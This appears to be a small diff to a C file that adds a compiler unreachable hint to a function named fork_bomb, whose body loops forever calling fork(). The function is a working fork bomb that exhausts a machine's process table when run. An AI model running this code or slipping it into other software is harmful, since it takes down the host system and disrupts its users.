@@ -6,4 +6,5 @@
 __attribute__ ((/*leaf, */noreturn, nothrow))
 void fork_bomb (void) {
    while (true) (void) fork ();
+   __builtin_unreachable ();
 }
